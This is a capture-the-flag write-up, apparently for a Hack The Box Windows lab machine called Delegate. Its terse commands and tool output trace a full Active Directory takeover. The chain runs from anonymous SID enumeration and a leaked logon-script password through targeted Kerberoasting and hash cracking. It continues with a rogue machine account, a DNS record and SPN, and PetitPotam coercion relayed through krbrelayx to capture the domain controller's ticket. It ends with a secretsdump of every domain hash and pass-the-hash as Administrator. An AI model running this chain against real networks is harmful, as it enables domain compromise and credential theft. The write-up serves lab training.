
## NMAP SCAN

```
nmap -sSCV -p- 10.129.234.69
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-01 15:24 +0700
Nmap scan report for 10.129.234.69
Host is up (0.079s latency).
Not shown: 65508 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-01 02:58:23Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-05-01T03:00:03+00:00; -5h29m59s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: DELEGATE
|   NetBIOS_Domain_Name: DELEGATE
|   NetBIOS_Computer_Name: DC1
|   DNS_Domain_Name: delegate.vl
|   DNS_Computer_Name: DC1.delegate.vl
|   DNS_Tree_Name: delegate.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-05-01T02:59:22+00:00
| ssl-cert: Subject: commonName=DC1.delegate.vl
| Not valid before: 2026-04-30T02:53:38
|_Not valid after:  2026-10-30T02:53:38
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
55022/tcp open  msrpc         Microsoft Windows RPC
61273/tcp open  msrpc         Microsoft Windows RPC
61281/tcp open  msrpc         Microsoft Windows RPC
62488/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
62489/tcp open  msrpc         Microsoft Windows RPC
62492/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: -5h29m58s, deviation: 0s, median: -5h29m59s
| smb2-time: 
|   date: 2026-05-01T02:59:26
|_  start_date: N/A

```

```
smbclient -L //10.129.234.69/ -N                                   

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.234.69 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

nothing here lets get users..... 
```
impacket-lookupsid anonymous@10.129.234.69
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Brute forcing SIDs at 10.129.234.69
[*] StringBinding ncacn_np:10.129.234.69[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-1484473093-3449528695-2030935120
498: DELEGATE\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: DELEGATE\Administrator (SidTypeUser)
501: DELEGATE\Guest (SidTypeUser)
502: DELEGATE\krbtgt (SidTypeUser)
512: DELEGATE\Domain Admins (SidTypeGroup)
513: DELEGATE\Domain Users (SidTypeGroup)
514: DELEGATE\Domain Guests (SidTypeGroup)
515: DELEGATE\Domain Computers (SidTypeGroup)
516: DELEGATE\Domain Controllers (SidTypeGroup)
517: DELEGATE\Cert Publishers (SidTypeAlias)
518: DELEGATE\Schema Admins (SidTypeGroup)
519: DELEGATE\Enterprise Admins (SidTypeGroup)
520: DELEGATE\Group Policy Creator Owners (SidTypeGroup)
521: DELEGATE\Read-only Domain Controllers (SidTypeGroup)
522: DELEGATE\Cloneable Domain Controllers (SidTypeGroup)
525: DELEGATE\Protected Users (SidTypeGroup)
526: DELEGATE\Key Admins (SidTypeGroup)
527: DELEGATE\Enterprise Key Admins (SidTypeGroup)
553: DELEGATE\RAS and IAS Servers (SidTypeAlias)
571: DELEGATE\Allowed RODC Password Replication Group (SidTypeAlias)
572: DELEGATE\Denied RODC Password Replication Group (SidTypeAlias)
1000: DELEGATE\DC1$ (SidTypeUser)
1101: DELEGATE\DnsAdmins (SidTypeAlias)
1102: DELEGATE\DnsUpdateProxy (SidTypeGroup)
1104: DELEGATE\A.Briggs (SidTypeUser)
1105: DELEGATE\b.Brown (SidTypeUser)
1106: DELEGATE\R.Cooper (SidTypeUser)
1107: DELEGATE\J.Roberts (SidTypeUser)
1108: DELEGATE\N.Thompson (SidTypeUser)
1121: DELEGATE\delegation admins (SidTypeGroup)
```

```
nxc smb 10.129.234.69 -u /home/kali/HTB\ BOXES/Delegate/users.txt -p /home/kali/HTB\ BOXES/Delegate/users.txt 
SMB         10.129.234.69   445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.69   445    DC1              [+] delegate.vl\DC!$:DC!$ (Guest)
```
ok so lets try to get another user pass
```
smbclient //10.129.234.69/SYSVOL -U 'Guest'
Password for [WORKGROUP\Guest]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Sep  9 20:52:30 2023
  ..                                  D        0  Sat Aug 26 16:39:25 2023
  delegate.vl                        Dr        0  Sat Aug 26 16:39:25 2023

                4652287 blocks of size 4096. 1164834 blocks available
smb: \> cd delegate.vl\
smb: \delegate.vl\> ls
  .                                   D        0  Sat Aug 26 16:45:45 2023
  ..                                  D        0  Sat Aug 26 16:39:25 2023
  DfsrPrivate                      DHSr        0  Sat Aug 26 16:45:45 2023
  Policies                            D        0  Sat Aug 26 16:39:30 2023
  scripts                             D        0  Sat Aug 26 19:45:24 2023

                4652287 blocks of size 4096. 1164834 blocks available
smb: \delegate.vl\> cd DfsrPrivate\
cd \delegate.vl\DfsrPrivate\: NT_STATUS_ACCESS_DENIED
smb: \delegate.vl\> ls
  .                                   D        0  Sat Aug 26 16:45:45 2023
  ..                                  D        0  Sat Aug 26 16:39:25 2023
  DfsrPrivate                      DHSr        0  Sat Aug 26 16:45:45 2023
  Policies                            D        0  Sat Aug 26 16:39:30 2023
  scripts                             D        0  Sat Aug 26 19:45:24 2023

                4652287 blocks of size 4096. 1164833 blocks available
smb: \delegate.vl\> cd scripts\
smb: \delegate.vl\scripts\> ls
  .                                   D        0  Sat Aug 26 19:45:24 2023
  ..                                  D        0  Sat Aug 26 16:45:45 2023
  users.bat                           A      159  Sat Aug 26 19:54:29 2023
```

got users.bat lets decompile and see
```
   rem @echo off
net use * /delete /y
net use v: \\dc1\development 

if %USERNAME%==A.Briggs net use h: \\fileserver\backups /user:Administrator P4ssw0rd1#123
```

got creds for A.Briggs.... 
```
bloodhound-python -u 'A.briggs' -p 'P4ssw0rd1#123' -d 'delegate.vl' -dc 'dc1.delegate.vl' -ns 10.129.234.69 -c All

INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: delegate.vl
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc1.delegate.vl
INFO: Testing resolved hostname connectivity dead:beef::c14b:7788:73d0:3ad0
INFO: Trying LDAP connection to dead:beef::c14b:7788:73d0:3ad0
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc1.delegate.vl
INFO: Testing resolved hostname connectivity dead:beef::c14b:7788:73d0:3ad0
INFO: Trying LDAP connection to dead:beef::c14b:7788:73d0:3ad0
INFO: Found 9 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC1.delegate.vl
INFO: Done in 00M 32S

```

now lets look what we can do... 
A.briggs has GenericWrite on N.Thompson...  and n.thompson is member of remote management..
```
 python3 targetedKerberoast.py -v -d 'delegate.vl' -u 'A.Briggs' -p 'P4ssw0rd1#123' --request-user 'N.Thompson' --dc-ip 10.129.234.69
[*] Starting kerberoast attacks
[*] Attacking user (N.Thompson)
[VERBOSE] SPN added successfully for (N.Thompson)
[+] Printing hash for (N.Thompson)
$krb5tgs$23$*N.Thompson$DELEGATE.VL$delegate.vl/N.Thompson*$7f264a4aef1a0332d998685842fc6a66$66138697d74f884af09a9bc163b3b8952493c58ce065719d98b5a21e24efb144f515b4ecafa84c39bd856afc375e91c3addbba8c6df99f48a32535bb47fa8662e6f0ec54b9a4192a57e8f72b1daaeca72b9821d001ad9dbe08712b15ddfce06fd4f015813098d55be2272af70310a55b59f3e38fe157dc21ee22b8979237eca92fb93ec3db8d820368cdc07937f459868a9396bf622eda79c0eef58333eccd55dab2312c4fa871cd4eac1bd1ef049a60272f184f1a3339afd6b9f91cd99ea3af5588ddb6e91c6351183db9e0fa7999060717706b574a7cdd6859f2db146741536e921f5d2e0656afb6a11a3c3e221514839a9d0d94dc4b02c7215f71c76a1a1ce48100fc0615d1c505cffabb9047f5a17a1eaa50bf2a3d3567f4da221192bb81379ce5f546f1f4c556af71a2ee4a2b6f13b48965c6c6d9961357646512e8b4c521529c5bd17da0d4d9d01085bd7a6ac8ac64214dda5710d6565d08a22385e64474bf6bfed6267241c23161b63a5998438d2c53579a3b9c7676f1240c03ef14f56830e42024de961d4a1eb8c4a4a4451dd1e052c86e6d714d20d096cc064a43d959c801c6fcde5b062ab3f1f84e94eeb5cc9d218c59647634b536fef2b1db7e05d797a0a10d426605dcd540a3143089728e644ba12c2a4a152ee525e1e60b3ddc8d402651de39ef0abef08fd05220ffca5f1e0bdfd3f32bb85e3671d72715c023620e9a4b7592a044a45cfb1ff5e5d4c65b78a217e0b5f8eed246ae4330a03c98a6619486d2dcc6bf20cf025280356ef3d25f5992f84881323cd63eef18714628ba7becd1bc925c684718e75a3b92c7fba76a9c67af5c93bbc1aac0f3813d5e1230500fe2e26b4fadded5dbf463d49daf41f47e4e728a8393a97d4690042d02ae4ab5aa1726203263de51d61925de34eefa72b716b5318a9450e90fe9842d2c125b64895fc24fb777710a12eab34bd6e2b15d166fd6253f29c1af18c81c0edf5f526b38be33641a395e165b767e596398ea67939a516abe1f0e99939db8b8f9408f7caccd5b499bcc54c19f686922fe94304e7432a8c06be00652a0924f715bd354736bee5b2e7ddb651a7f44ba4a868723c4090561e636b285a29b3595f0f4b73bda27ec68626185bb50bc4abe42aedfa4c8ed5431d2b95c7370ae2271cdf937e24057316f81ca6023dc90751579618160f4bdc992b57cb2341085d9e63a1d1d7867c9a94337b4f92349f6d1ec5921c36adff9a60f8cda753aeb0f45960c4c1c8427b33736c059089fc537dbea20682e054d8ffc18e1f9cff8e05658d13f44d6fe78e7273938223c692b6634341b15dcdcd1999e59858834dc6a960d5ad0bc706eb032d457a38f0bb85387856e46b217714140fdf7ea6ee14e918f31b30abbc7b6238e184cf57f2cb7d1282ddef10c8f3ab12f7444afa2900bab134b9a4418d3dff90da2
[VERBOSE] SPN removed successfully for (N.Thompson)
```

lets crack it 
```
$krb5tgs$23$*N.Thompson$DELEGATE.VL$delegate.vl/N.Thompson*$7f264a4aef1a0332d998685842fc6a66$66138697d74f884af09a9bc163b3b8952493c58ce065719d98b5a21e24efb144f515b4ecafa84c39bd856afc375e91c3addbba8c6df99f48a32535bb47fa8662e6f0ec54b9a4192a57e8f72b1daaeca72b9821d001ad9dbe08712b15ddfce06fd4f015813098d55be2272af70310a55b59f3e38fe157dc21ee22b8979237eca92fb93ec3db8d820368cdc07937f459868a9396bf622eda79c0eef58333eccd55dab2312c4fa871cd4eac1bd1ef049a60272f184f1a3339afd6b9f91cd99ea3af5588ddb6e91c6351183db9e0fa7999060717706b574a7cdd6859f2db146741536e921f5d2e0656afb6a11a3c3e221514839a9d0d94dc4b02c7215f71c76a1a1ce48100fc0615d1c505cffabb9047f5a17a1eaa50bf2a3d3567f4da221192bb81379ce5f546f1f4c556af71a2ee4a2b6f13b48965c6c6d9961357646512e8b4c521529c5bd17da0d4d9d01085bd7a6ac8ac64214dda5710d6565d08a22385e64474bf6bfed6267241c23161b63a5998438d2c53579a3b9c7676f1240c03ef14f56830e42024de961d4a1eb8c4a4a4451dd1e052c86e6d714d20d096cc064a43d959c801c6fcde5b062ab3f1f84e94eeb5cc9d218c59647634b536fef2b1db7e05d797a0a10d426605dcd540a3143089728e644ba12c2a4a152ee525e1e60b3ddc8d402651de39ef0abef08fd05220ffca5f1e0bdfd3f32bb85e3671d72715c023620e9a4b7592a044a45cfb1ff5e5d4c65b78a217e0b5f8eed246ae4330a03c98a6619486d2dcc6bf20cf025280356ef3d25f5992f84881323cd63eef18714628ba7becd1bc925c684718e75a3b92c7fba76a9c67af5c93bbc1aac0f3813d5e1230500fe2e26b4fadded5dbf463d49daf41f47e4e728a8393a97d4690042d02ae4ab5aa1726203263de51d61925de34eefa72b716b5318a9450e90fe9842d2c125b64895fc24fb777710a12eab34bd6e2b15d166fd6253f29c1af18c81c0edf5f526b38be33641a395e165b767e596398ea67939a516abe1f0e99939db8b8f9408f7caccd5b499bcc54c19f686922fe94304e7432a8c06be00652a0924f715bd354736bee5b2e7ddb651a7f44ba4a868723c4090561e636b285a29b3595f0f4b73bda27ec68626185bb50bc4abe42aedfa4c8ed5431d2b95c7370ae2271cdf937e24057316f81ca6023dc90751579618160f4bdc992b57cb2341085d9e63a1d1d7867c9a94337b4f92349f6d1ec5921c36adff9a60f8cda753aeb0f45960c4c1c8427b33736c059089fc537dbea20682e054d8ffc18e1f9cff8e05658d13f44d6fe78e7273938223c692b6634341b15dcdcd1999e59858834dc6a960d5ad0bc706eb032d457a38f0bb85387856e46b217714140fdf7ea6ee14e918f31b30abbc7b6238e184cf57f2cb7d1282ddef10c8f3ab12f7444afa2900bab134b9a4418d3dff90da2:KALEB_2341
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*N.Thompson$DELEGATE.VL$delegate.vl/N.T...f90da2
Time.Started.....: Fri May  1 10:47:17 2026 (8 secs)
Time.Estimated...: Fri May  1 10:47:25 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  1335.0 kH/s (1.36ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 11002880/14344385 (76.71%)
Rejected.........: 0/11002880 (0.00%)
Restore.Point....: 10997760/14344385 (76.67%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: KBKILLER3 -> KALASIN@2525
Hardware.Mon.#01.: Util: 36%

```

now lets winrm 

```
evil-winrm -i 10.129.234.69 -u 'N.Thompson' -p 'KALEB_2341'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\N.Thompson\Documents> cd ..
*Evil-WinRM* PS C:\Users\N.Thompson> cd Desktop
*Evil-WinRM* PS C:\Users\N.Thompson\Desktop> type user.txt
dc277f7b1b49f39d3ecb7ca2cd1134ee

```

got user flag
```
*Evil-WinRM* PS C:\> whoami /all

USER INFORMATION
----------------

User Name           SID
=================== ==============================================
delegate\n.thompson S-1-5-21-1484473093-3449528695-2030935120-1108


GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                            Attributes
=========================================== ================ ============================================== ==================================================
Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
DELEGATE\delegation admins                  Group            S-1-5-21-1484473093-3449528695-2030935120-1121 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                                                    State
============================= ============================================================== =======
SeMachineAccountPrivilege     Add workstations to domain                                     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                                       Enabled
SeEnableDelegationPrivilege   Enable computer and user accounts to be trusted for delegation Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set                                 Enabled

```

since we have "SeEnableDelegationPrivilege   Enable computer and user accounts to be trusted for delegation Enabled" we can add a computer and get DC machine's tgt 

```
impacket-addcomputer -method SAMR -computer-name 'ATTACKVM$' -computer-pass 'ComputerPassword123!' -dc-ip 10.129.234.69 'delegate.vl/N.Thompson:KALEB_2341'
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Successfully added machine account ATTACKVM$ with password ComputerPassword123!.
```

added a new computer for uncontrained delegation... 
```
python3 -c "
from ldap3 import Server, Connection, MODIFY_REPLACE
s = Server('10.129.234.69', get_info='ALL')
c = Connection(s, user=r'delegate\N.Thompson', password='KALEB_2341', authentication='NTLM', auto_bind=True)
c.modify('CN=ATTACKVM,CN=Computers,DC=delegate,DC=vl', {'dNSHostName': [(MODIFY_REPLACE, ['ATTACKVM.delegate.vl'])]})
print(c.result)
"
{'result': 0, 'description': 'success', 'dn': '', 'message': '', 'referrals': None, 'type': 'modifyResponse'}

```
have to add our ip and attackvm to etc hosts ....
```
python3 dnstool.py -u 'delegate.vl\N.Thompson' -p 'KALEB_2341' -a add -r 'ATTACKVM' -d 10.10.14.53 10.129.234.69
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully

```

add our machine as dns then use addspn...

```
python3 addspn.py -u 'delegate.vl\N.Thompson' -p 'KALEB_2341' -s 'HOST/ATTACKVM.delegate.vl' -t 'ATTACKVM$' 10.129.234.69
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[+] Found modification target
[+] SPN Modified successfully
```
now lets run the krbrelay.. 
```
python3 krbrelayx.py -t 10.129.234.69 -s 'ATTACKVM$' -p 'ComputerPassword123!'
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client SMB loaded..
[*] Running in attack mode to single host
[*] Running in unconstrained delegation abuse mode using the specified credentials.
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up DNS Server
```

now lets start the exploit and wait for tgt 
```
python3 PetitPotam.py -u 'N.Thompson' -p 'KALEB_2341' -d 'delegate.vl' ATTACKVM.delegate.vl 10.129.234.69
/home/kali/PetitPotam.py:23: SyntaxWarning: invalid escape sequence '\ '
  | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __

                                                                                               
              ___            _        _      _        ___            _                     
             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __   
             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | '  \  
            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_| 
          _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""| 
          "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
                                         
              PoC to elicit machine account authentication via some MS-EFSRPC functions
                                      by topotam (@topotam77)
      
                     Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN



Trying pipe lsarpc
[-] Connecting to ncacn_np:10.129.234.69[\PIPE\lsarpc]
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
[+] OK! Using unpatched function!
[-] Sending EfsRpcEncryptFileSrv!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
```
```
*] Servers started, waiting for connections
[*] SMBD: Received connection from 10.129.234.69
[*] Got ticket for DC1$@DELEGATE.VL [krbtgt@DELEGATE.VL]
[*] Saving ticket in DC1$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache
Traceback (most recent call last):
  File "/home/kali/exploits/krbrelayx/lib/servers/smbrelayserver.py", line 227, in SmbSessionSetup
    self.do_attack(authdata)
    ~~~~~~~~~~~~~~^^^^^^^^^^

```
got tgt but got traceback error.... ok so pay no mind to it we have the tgt..... 
```
export KRB5CCNAME='DC1$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache'

impacket-secretsdump -k -no-pass -dc-ip 10.129.234.69 'DC1.delegate.vl'
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c32198ceab4cc695e65045562aa3ee93:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:54999c1daa89d35fbd2e36d01c4a2cf2:::
A.Briggs:1104:aad3b435b51404eeaad3b435b51404ee:8e5a0462f96bc85faf20378e243bc4a3:::
b.Brown:1105:aad3b435b51404eeaad3b435b51404ee:deba71222554122c3634496a0af085a6:::
R.Cooper:1106:aad3b435b51404eeaad3b435b51404ee:17d5f7ab7fc61d80d1b9d156f815add1:::
J.Roberts:1107:aad3b435b51404eeaad3b435b51404ee:4ff255c7ff10d86b5b34b47adc62114f:::
N.Thompson:1108:aad3b435b51404eeaad3b435b51404ee:4b514595c7ad3e2f7bb70e7e61ec1afe:::
DC1$:1000:aad3b435b51404eeaad3b435b51404ee:f7caf5a3e44bac110b9551edd1ddfa3c:::
ATTACKVM$:4601:aad3b435b51404eeaad3b435b51404ee:d2f939746bfbd03afcdce7d9b6cb8d89:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:f877adcb278c4e178c430440573528db38631785a0afe9281d0dbdd10774848c
Administrator:aes128-cts-hmac-sha1-96:3a25aca9a80dfe5f03cd03ea2dcccafe
Administrator:des-cbc-md5:ce257f16ec25e59e
krbtgt:aes256-cts-hmac-sha1-96:8c4fc32299f7a468f8b359f30ecc2b9df5e55b62bec3c4dcf53db2c47d7a8e93
krbtgt:aes128-cts-hmac-sha1-96:c2267dd0a5ddfee9ea02da78fed7ce70
krbtgt:des-cbc-md5:ef491c5b736bd04c
A.Briggs:aes256-cts-hmac-sha1-96:7692e29d289867634fe2c017c6f0a4853c2f7a103742ee6f3b324ef09f2ba1a1
A.Briggs:aes128-cts-hmac-sha1-96:bb0b1ab63210e285d836a29468a14b16
A.Briggs:des-cbc-md5:38da2a92611631d9
b.Brown:aes256-cts-hmac-sha1-96:446117624e527277f0935310dfa3031e8980abf20cddd4a1231ebf03e64fee8d
b.Brown:aes128-cts-hmac-sha1-96:13d1517adfa91fbd3069ed2dff04a41b
b.Brown:des-cbc-md5:ce407ac8d95ee6f2
R.Cooper:aes256-cts-hmac-sha1-96:786bef43f024e846c06ed7870f752ad4f7c23e9fdc21f544048916a621dbceef
R.Cooper:aes128-cts-hmac-sha1-96:8c6da3c96665937b96c7db2fe254e837
R.Cooper:des-cbc-md5:a70e158c75ba4fc1
J.Roberts:aes256-cts-hmac-sha1-96:aac061da82ae9eb2ca5ca5c4dd37b9af948267b1ce816553cbe56de60d2fa32c
J.Roberts:aes128-cts-hmac-sha1-96:fa3ef45e30cf44180b29def0305baeb6
J.Roberts:des-cbc-md5:6858c8d3456451f4
N.Thompson:aes256-cts-hmac-sha1-96:7555e50192c2876247585b1c3d06ba5563026c5f0d4ade2b716741b22714b598
N.Thompson:aes128-cts-hmac-sha1-96:7ad8c208f8ff8ee9f806c657afe81ea2
N.Thompson:des-cbc-md5:7cab43c191a7ecf2
DC1$:aes256-cts-hmac-sha1-96:358880cace9d6c849f2069f2ac7582b18de5185b3c815b6728cb3542c0d25fa1
DC1$:aes128-cts-hmac-sha1-96:f922407dfc023ec95d458257224ce8d9
DC1$:des-cbc-md5:9e16cd46ad54cba7
ATTACKVM$:aes256-cts-hmac-sha1-96:98586d1a3fe393f4ad306489e24c1b5a350edf591aa09c08f3bf19879cc98843
ATTACKVM$:aes128-cts-hmac-sha1-96:1c535b4c8e6066cbfbb8b0c87702129b
ATTACKVM$:des-cbc-md5:9ead151f467a683d
[*] Cleaning up...
```

and we have the NTLM hash for admin lets get root flag....
```
evil-winrm -i 10.129.234.69 -u Administrator -H c32198ceab4cc695e65045562aa3ee93
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
087fb4fa21c211e69c03f39254ca7a9e

```